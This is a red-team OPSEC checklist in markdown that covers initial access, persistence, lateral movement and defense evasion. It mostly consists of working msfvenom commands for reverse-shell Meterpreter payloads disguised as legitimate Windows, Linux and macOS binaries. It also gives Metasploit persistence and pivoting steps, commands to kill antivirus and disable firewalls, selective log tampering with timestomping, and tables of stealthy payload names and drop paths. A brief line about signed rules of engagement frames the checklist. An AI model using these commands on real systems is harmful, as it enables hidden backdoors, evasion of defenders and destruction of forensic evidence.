---
title: OpSec Checklist
draft: false
tags:
  - red-teaming
  - opsec
---
# Overview

**Purpose:** Operational checklist for Red Team engagements covering Initial Access, Situational Awareness, Persistence, Lateral Movement, and Defense Evasion — with emphasis on payload placement, naming, and Metasploit tooling for OPSEC.

**Scope:** Windows, Linux, macOS, and Cloud/Container environments.

**Use:** Review each phase before, during, and after execution. Tick items as completed.

---

## 1. Initial Access (TA0001)

- [ ] **Exploit Public-Facing Applications (T1190)**
  - Check for unpatched vulnerabilities (e.g., CVE-2024-3400 PAN-OS, CVE-2023-34362 MOVEit, CVE-2021-44228 Log4Shell)
  - Verify exploit reliability in lab before production
  - Prepare fallback exploit if primary fails

- [ ] **Valid Accounts (T1078)**
  - Search for leaked credentials (info stealers, breach dumps, paste sites)
  - Test default credentials on exposed services
  - Check for password reuse across services

- [ ] **Phishing (T1566)**
  - Prepare payloads: ISO, LNK, IMG, VHD, OneNote, HTML smuggling
  - Credential harvesting: Evilginx2, Modlishka, GoPhish
  - Verify SMTP reputation and domain age before sending
  - Use lookalike domains with valid TLS

- [ ] **Trusted Relationship (T1199)**
  - Enumerate third-party vendors / MSPs
  - Check supply chain entry points

- [ ] **Hardware Additions (T1200)**
  - Prepare drop devices (LAN Turtle, Bash Bunny, O.MG cable)
  - Label devices to look like legit hardware

---

## 2. Situational Awareness (Post-Access Discovery)

- [ ] **LOLBAS Recon**
  - `whoami /priv` — privilege enumeration
  - `whoami /groups` — group membership
  - `systeminfo` — OS, patch level, domain
  - `tasklist /v` — running processes
  - `netstat -ano` — active connections
  - `netsh advfirewall show allprofiles` — firewall state
  - `wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname` — AV product

- [ ] **AV/EDR Discovery**
  - PowerShell: `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"`
  - Check for EDR processes: `Get-Process | Where-Object {$_.Company -match "CrowdStrike|SentinelOne|Carbon Black|Cybereason|Defender"}`
  - Check drivers: `driverquery /v | findstr /i "edr crowd sentinel carbon"`

- [ ] **User & Network Context**
  - `ipconfig /all` — network interfaces
  - `route print` — routing table
  - `net user /domain` — domain users
  - `net group "Domain Admins" /domain` — DA enumeration
  - `nltest /dclist:<domain>` — domain controllers

- [ ] **Timing & Noise**
  - Do NOT run all commands in under 5 seconds
  - Introduce jitter between discovery commands
  - Prefer single-command enumeration over scripted bursts
  - Avoid `cmd.exe /c` chains that look like automation

- [ ] **Cloud Discovery**
  - AWS: `aws sts get-caller-identity`, `aws iam list-users`
  - Azure: `az account show`, `az ad user list`
  - GCP: `gcloud auth list`, `gcloud projects list`

---

## 3. Persistence (TA0003)

- [ ] **Scheduled Tasks (T1053.005)**
  - `schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineUA" /tr "C:\ProgramData\Microsoft\Windows\Caches\MicrosoftEdgeUpdate.exe" /sc onlogon /rl highest`
  - Prefer real task names (Edge, OneDrive, Adobe)
  - Store task XML in `C:\Windows\System32\Tasks\Microsoft\Windows\`

- [ ] **Registry Run Keys (T1547.001)**
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
  - Name entries like `OneDriveSync`, `MicrosoftEdgeAutoLaunch`

- [ ] **WMI Event Subscription (T1546.003)**
  - Permanent event consumer (no process, no file on disk)
  - Class name: `Office_Updater`, `BVTFilter`, `SCM Event Log Filter`
  - Use `mofcomp` or PowerShell `Set-WmiInstance`

- [ ] **Services (T1543.003)**
  - Name: `Windows Update Medic Service`, `MicrosoftEdgeElevationService`
  - Binary path: legitimate-looking directory
  - Set `SERVICE_AUTO_START` with delayed start

- [ ] **Linux Persistence**
  - Cron: `/etc/cron.d/0logrotate`, `/var/spool/cron/crontabs/root`
  - Systemd: `/usr/lib/systemd/system/systemd-timesyncd-helper.service`
  - `.bashrc` / `.profile` injection
  - `~/.config/autostart/` (XDG)
  - SSH `authorized_keys` with comment `user@host`

- [ ] **macOS Persistence**
  - `~/Library/LaunchAgents/com.apple.spotlight.helper.plist`
  - `/Library/LaunchDaemons/com.apple.softwareupdated.plist`
  - Login Items via `osascript`
  - `~/Library/Application Support/` for payload

- [ ] **Account Manipulation (T1098)**
  - Add SSH keys, create service accounts, modify role assignments
  - Add credentials to cloud IAM

---

## 4. Lateral Movement (TA0008)

- [ ] **Remote Services (T1021)**
  - RDP (T1021.001), SMB/Admin Shares (T1021.002), SSH (T1021.004), WinRM (T1021.006), VNC (T1021.005)
  - Use valid accounts; avoid password spraying (noisy)

- [ ] **Exploit Remote Services (T1210)**
  - EternalBlue (MS17-010), ZeroLogon (CVE-2020-1472), PrintNightmare (CVE-2021-34527)
  - Only if standard access fails; high detection risk

- [ ] **Lateral Tool Transfer (T1570)**
  - Use SMB, WinRM, or SSH to copy tools — avoid external downloads
  - `copy \\target\C$\ProgramData\Microsoft\Windows\Caches\MicrosoftEdgeUpdate.exe`

- [ ] **Software Deployment Tools (T1072)**
  - SCCM, Ansible, PDQ Deploy, Intune, Chef, Puppet
  - Abuse existing deployment pipelines

- [ ] **Pass the Hash / Pass the Ticket (T1550)**
  - Mimikatz, Rubeus, Impacket
  - Clean up LSASS access artifacts

- [ ] **Cloud Lateral Movement**
  - AWS: AssumeRole chains, SSM Run Command
  - Azure: Managed Identity abuse, Azure AD Connect

---

## 5. Defense Evasion (Hiding from Blue Team)

- [ ] **Log Manipulation**
  - Windows: clear specific Event IDs, not whole log
    - `wevtutil cl Security` is NOISY — avoid
    - Prefer surgical deletion via `EventLog` API
  - Linux: parse and remove specific lines, preserve timestamps
    - Avoid `rm -f /var/log/secure` (creates gap)
    - Use `sed -i '/<attacker-ip>/d' /var/log/secure` then `touch -r /etc/hostname /var/log/secure`
  - Preserve file size, mtime, and inode where possible

- [ ] **Process/File Hiding**
  - Linux: `LD_PRELOAD` hook for `syslog`, `readdir`
  - Windows: process hollowing, DLL sideloading, module stomping
  - macOS: `DYLD_INSERT_LIBRARIES`

- [ ] **C2 Traffic Mimicry**
  - Profile legitimate traffic (Microsoft Teams, Slack, Google Update)
  - Match URIs, headers, User-Agent, JA3/JA4
  - Use `sleep_mask` to encrypt heap during sleep
  - Use valid Let's Encrypt certs — never self-signed
  - Domain fronting / CDN fronting where applicable

- [ ] **Infrastructure Segregation**
  - Tier 1: Phishing / Delivery VPS + domains
  - Tier 2: Interactive C2 (separate provider, domain, cert)
  - Tier 3: Long-haul persistence (separate again)
  - Never reuse infrastructure across tiers

- [ ] **Timestomping**
  - Windows: `Set-ItemProperty` or `NtSetInformationFile`
  - Linux: `touch -r /etc/hostname <payload>`
  - Match `CreationTime`, `LastWriteTime`, `LastAccessTime` to parent

- [ ] **Signature Evasion**
  - Strip strings: `strip`, `donut`, `ConfuserEx`
  - Sign with expired/leaked cert if possible
  - Prefer LOLBAS as proxy over custom binaries

- [ ] **AMSI / ETW Bypass**
  - Patch `amsi.dll` in memory
  - Disable ETW providers (`EtwEventWrite` patch)
  - Use reflective loading to avoid disk artifacts

---

## 6. Payload Placement & Naming

### 6.1 Windows Drop Directories

| Path | Why It Works | Risk |
|------|-------------|------|
| `C:\ProgramData\Microsoft\Windows\Caches\` | Rarely audited, SYSTEM-writable | Low |
| `C:\ProgramData\Microsoft\Windows\WER\ReportQueue\` | Error reporting noise | Low |
| `C:\Users\Public\Documents\` | Shared, expected user activity | Medium |
| `C:\Windows\Temp\` | High noise, needle in haystack | Medium |
| `%APPDATA%\Microsoft\Windows\Themes\` | Rarely monitored | Low |
| `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cache\` | Browser cache | Low |
| `C:\ProgramData\Adobe\ARM\Reader_<version>\` | Legacy Adobe path | Low |
| `C:\Windows\System32\Tasks\Microsoft\Windows\` | Task XML storage | Medium |
| `%PROGRAMFILES%\Windows Defender\` | Trusted path (needs admin) | High |

**Avoid:** `C:\Temp\`, `C:\Users\Public\` root, Desktop, Downloads, `C:\Windows\System32\` root.

### 6.2 Windows Payload Names

| Type | Name | Rationale |
|------|------|-----------|
| Beacon | `MicrosoftEdgeUpdate.exe` | Legit updater |
| Beacon | `OneDriveStandaloneUpdater.exe` | Frequent runner |
| Beacon | `GoogleUpdate.exe` | Trusted, ubiquitous |
| Beacon | `AdobeARMHelper.exe` | Legacy, low scrutiny |
| Loader | `msedgeupdate.dll` | DLL sideload target |
| Loader | `version.dll` | Classic sideload |
| Script | `OfficeTelemetry.ps1` | Boring name |
| Script | `WindowsUpdateCheck.ps1` | Admin-plausible |
| Task | `MicrosoftEdgeUpdateTaskMachineUA` | Real task name |
| Task | `OneDrive Standalone Update Task` | Real task name |
| Service | `Windows Update Medic Service` | Real service |
| Service | `MicrosoftEdgeElevationService` | Real service |
| LNK | `Important_Document.pdf.lnk` | Phishing lure |
| LNK | `Invoice_2024_Q4.lnk` | Business context |

**Rules:** Match vendor casing; avoid underscores in EXE; prefer `.exe` over `.scr`/`.pif`/`.com`; timestomp to match neighbors.

### 6.3 Linux Drop Directories

| Path | Why It Works | Risk |
|------|-------------|------|
| `/var/tmp/` | Survives reboot, less monitored | Low |
| `/dev/shm/` | tmpfs, memory-only | Low |
| `/run/user/<uid>/` | systemd user runtime | Low |
| `~/.cache/` | XDG cache | Low |
| `~/.local/share/` | XDG data | Low |
| `/usr/lib/systemd/system/` | Service units | Medium |
| `/etc/cron.d/` | Cron, overlooked | Medium |
| `/usr/local/lib/` | Local libs | Low |

**Avoid:** `/tmp/` (noexec), `/root/`, Desktop, `/etc/` root.

### 6.4 Linux Payload Names

| Type | Name | Rationale |
|------|------|-----------|
| ELF | `systemd-udevd` (non-standard path) | Real daemon |
| ELF | `dbus-daemon` (copy) | Common process |
| ELF | `rsyslogd` (copy) | Log daemon |
| Script | `update-motd.d/99-sysinfo` | MOTD script |
| Cron | `0logrotate` or `0anacron` | Sorts first |
| Systemd | `systemd-timesyncd-helper.service` | Real prefix |
| SO | `libnss_cache.so.2` | NSS module naming |

**Rules:** lowercase with hyphens/underscores; prefix `lib` for SOs; avoid `rootkit`, `backdoor`, `shell`.

### 6.5 macOS Drop Directories & Names

| Path | Payload Name |
|------|-------------|
| `~/Library/Application Support/` | `com.apple.softwareupdated` |
| `~/Library/Caches/` | `com.apple.mDNSResponderHelper` |
| `~/Library/LaunchAgents/` | `com.apple.spotlight.helper.plist` |
| `/Library/LaunchDaemons/` | `com.apple.softwareupdated.plist` |

### 6.6 Cloud / Container

| Context | Path / Name |
|---------|-------------|
| AWS Lambda | `/tmp/bootstrap` |
| Kubernetes | `/var/run/secrets/kube-proxy-helper` |
| Docker | Volume mount `healthcheck.sh` |
| Azure | `C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\` |

---

## 7. OPSEC Naming Principles

1. **Lexical Camouflage** — name should appear in `tasklist`/`ps` alongside 5+ real processes.
2. **Path Credibility** — if a path wouldn't normally contain that file, don't put it there.
3. **Timestamp Consistency** — match Creation, LastWrite, LastAccess to parent dir.
4. **Icon & Metadata** — copy version info/resource from a real binary (`rcedit`).
5. **Extension Logic** — `.dll` in System32, `.so` in `/usr/lib`, `.plist` in LaunchAgents.
6. **Avoid IOCs in Strings** — no `beacon`, `c2`, `payload`, `meterpreter`, or your handle. Strip with `strip`/`donut`/`ConfuserEx`.
7. **Signed > Unsigned** — leaked/expired cert or LOLBAS proxy.
8. **Rotate Names** — never reuse across hosts in one engagement.

---

## 8. Quick Reference: Top 5 Safest Combos

| OS | Path | Filename |
|----|------|----------|
| Windows | `C:\ProgramData\Microsoft\Windows\Caches\` | `MicrosoftEdgeUpdate.exe` |
| Windows | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cache\` | `msedgeupdate.dll` |
| Linux | `/dev/shm/` | `systemd-udevd` |
| Linux | `~/.cache/` | `libnss_cache.so.2` |
| macOS | `~/Library/Caches/` | `com.apple.softwareupdated` |

---

## 9. Pre-Engagement OPSEC Checklist

- [ ] Infrastructure segregated (Tier 1 / 2 / 3)
- [ ] Domains aged > 30 days with valid TLS
- [ ] C2 profile matches target environment (Malleable C2, HTTP profiles)
- [ ] Payloads stripped of strings and IOCs
- [ ] Timestomping plan documented
- [ ] Log manipulation plan documented
- [ ] Rollback / cleanup procedure ready
- [ ] Rules of Engagement (RoE) signed
- [ ] Emergency contact + kill switch established

---

## 10. Post-Engagement Cleanup

- [ ] Remove scheduled tasks, services, registry keys
- [ ] Remove WMI event subscriptions
- [ ] Remove dropped payloads
- [ ] Remove cron jobs / systemd units / LaunchAgents
- [ ] Revoke created accounts and SSH keys
- [ ] Restore modified logs (if possible)
- [ ] Document all artifacts for blue team debrief

---

## 11. Metasploit Payload Generation & Persistence

### 11.1 msfvenom Payload Generation

- [ ] **Windows Meterpreter (x64)**
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o MicrosoftEdgeUpdate.exe
  ```

- [ ] **Windows with Process Migration (OpSec)**
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 \
    -e x86/shikata_ga_nai -i 5 -b "\x00" \
    PrependMigrate=true PrependMigrateProc=svchost.exe \
    -f exe -o MicrosoftEdgeUpdate.exe
  ```
  *Migrates to `svchost.exe` immediately on execution — blends into process list* 

- [ ] **Linux ELF Payload**
  ```bash
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o systemd-udevd
  ```

- [ ] **macOS Mach-O Payload**
  ```bash
  msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f macho -o com.apple.softwareupdated
  ```

- [ ] **Template Injection (DLL Sideload)**
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 \
    -x /path/to/legit.exe -k -f exe -o msedgeupdate.exe
  ```
  *Uses `-x` to embed payload in legitimate binary, `-k` preserves original behavior* 

- [ ] **Staged vs Stageless**
  - Staged: `windows/x64/meterpreter/reverse_tcp` — smaller, needs handler
  - Stageless: `windows/x64/meterpreter_reverse_tcp` — larger, no stager callback
  - Prefer stageless for high-latency or heavily monitored networks

---

### 11.2 MSF Post-Exploitation Persistence: `post/windows/manage/persistence_exe`

This module uploads an executable to a remote host and makes it persistent. It supports **USER**, **SYSTEM**, or **SERVICE** startup types .

- [ ] **Basic Usage (from Meterpreter session)**
  ```
  use post/windows/manage/persistence_exe
  set REXEPATH /path/to/your/payload.exe
  set REXENAME MicrosoftEdgeUpdate.exe
  set SESSION 1
  set STARTUP USER
  exploit
  ```

- [ ] **Module Options Reference**

| Option     | Description                        | Recommended Value              |
| ---------- | ---------------------------------- | ------------------------------ |
| `REXEPATH` | Local path to executable to upload | `/path/to/payload.exe`         |
| `REXENAME` | Name on remote system              | `MicrosoftEdgeUpdate.exe`      |
| `SESSION`  | Meterpreter session ID             | Target session                 |
| `STARTUP`  | Persistence type                   | `USER`, `SYSTEM`, or `SERVICE` |
| `RUN_NOW`  | Execute immediately after install  | `true`                         |


- [ ] **STARTUP Type Selection**

| Type      | Trigger       | Requires      | OpSec Notes                                 |
| --------- | ------------- | ------------- | ------------------------------------------- |
| `USER`    | User login    | Standard user | Best for stealth; wait for login            |
| `SYSTEM`  | System boot   | Admin/SYSTEM  | Survives reboot; higher visibility          |
| `SERVICE` | Service start | Admin/SYSTEM  | Most persistent; may trigger service alerts |


- [ ] **OpSec Considerations**
  - Rename payload to match legitimate updater (e.g., `svchosts.exe` mimicking `svchost.exe`) 
  - Use `STARTUP USER` if SERVICE fails or triggers alerts 
  - Module generates a **cleanup RC file** — save for post-engagement cleanup 
  - Check cleanup file location: `Cleanup Meterpreter RC File: <path>` 

---

### 11.3 Multi/Handler Setup

- [ ] **Start Listener**
  ```
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST <Your_IP>
  set LPORT 4444
  exploit -j
  ```
  *Run as background job with `-j` to continue using console* 

---

## 12. Metasploit Post-Exploitation Modules for OpSec

### 12.1 Situational Awareness

- [ ] **System Information**
  ```
  sysinfo
  ```
  *Get OS, architecture, domain, logged-on users* 

- [ ] **Process List & Migration**
  ```
  ps
  migrate <PID>
  ```
  *Migrate to stable, legitimate process (e.g., `explorer.exe`, `svchost.exe`)* 

- [ ] **Network Enumeration**
  ```
  ipconfig /all
  route print
  arp -a
  ```

- [ ] **AV/Firewall Discovery**
  ```
  run post/windows/gather/enum_av
  run post/windows/gather/enum_firewall
  ```

---

### 12.2 Lateral Movement & Pivoting

- [ ] **Add Route to Internal Network**
  ```
  run autoroute -s 10.10.10.0/24
  run autoroute -p
  ```
  *Enables pivoting through compromised host* 

- [ ] **Port Forwarding**
  ```
  portfwd add -l 3389 -p 3389 -r 10.10.10.50
  ```
  *Forward RDP, SMB, or other services* 

- [ ] **SOCKS Proxy**
  ```
  use auxiliary/server/socks_proxy
  set SRVPORT 1080
  set VERSION 4a
  run -j
  ```
  *Then use proxychains for tool routing* 

- [ ] **ARP Scanner Through Pivot**
  ```
  use post/windows/gather/arp_scanner
  set RHOSTS 10.10.10.0/24
  set SESSION 1
  run
  ```
  *Discover hosts on internal network* 

- [ ] **Port Proxy Module**
  ```
  use post/windows/manage/portproxy
  set CONNECT_ADDRESS 10.10.10.50
  set CONNECT_PORT 445
  set LOCAL_ADDRESS 0.0.0.0
  set LOCAL_PORT 8445
  set SESSION 1
  run
  ```
  *Set up port forwarding rules on Windows host* 

---

### 12.3 Defense Evasion

- [ ] **Kill AV**
  ```
  run post/windows/manage/killav
  ```
  *Attempts to stop AV processes* 

- [ ] **Disable Firewall**
  ```
  shell
  netsh advfirewall set allprofiles state off
  ```

- [ ] **Clear Event Logs**
  ```
  clearev
  ```
  *Clears Application, System, and Security logs (Windows only)* 

---

### 12.4 Cleanup & Anti-Forensics

- [ ] **Remove Persistence**
  ```
  run post/windows/manage/persistence_exe
  # Review generated cleanup RC file and execute manually
  ```

- [ ] **Delete Uploaded Files**
  ```
  rm C:\\ProgramData\\Microsoft\\Windows\\Caches\\MicrosoftEdgeUpdate.exe
  ```

- [ ] **Clear Command History**
  ```
  shell
  del %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
  ```

- [ ] **Timestomp Files**
  ```
  timestomp C:\\ProgramData\\Microsoft\\Windows\\Caches\\MicrosoftEdgeUpdate.exe -f C:\\Windows\\System32\\svchost.exe
  ```
  *Match timestamps to legitimate system files* 

---

## 13. Updated Quick Reference: Metasploit + OpSec Combos

| Phase | Module/Command | Payload Name | OpSec Notes |
|-------|---------------|--------------|-------------|
| Initial Access | `exploit/windows/smb/ms17_010_eternalblue` | `windows/x64/meterpreter/reverse_tcp` | Add `PrependMigrate=true`  |
| Persistence | `post/windows/manage/persistence_exe` | `MicrosoftEdgeUpdate.exe` | `STARTUP USER` for stealth  |
| Lateral | `autoroute` + `socks_proxy` | N/A | Segregate infrastructure tiers  |
| Cleanup | `clearev` + manual cleanup RC | N/A | Execute generated cleanup script  |

---

## 14. Metasploit Evasion Modules (Advanced)

- [ ] **List Evasion Modules**
  ```
  show evasion
  ```

- [ ] **Windows Defender Evasion Example**
  ```
  use evasion/windows/windows_defender_exe
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST <IP>
  set LPORT 4444
  run
  ```

- [ ] **Note:** Evasion modules produce standalone payloads; pair with `multi/handler` on the listener side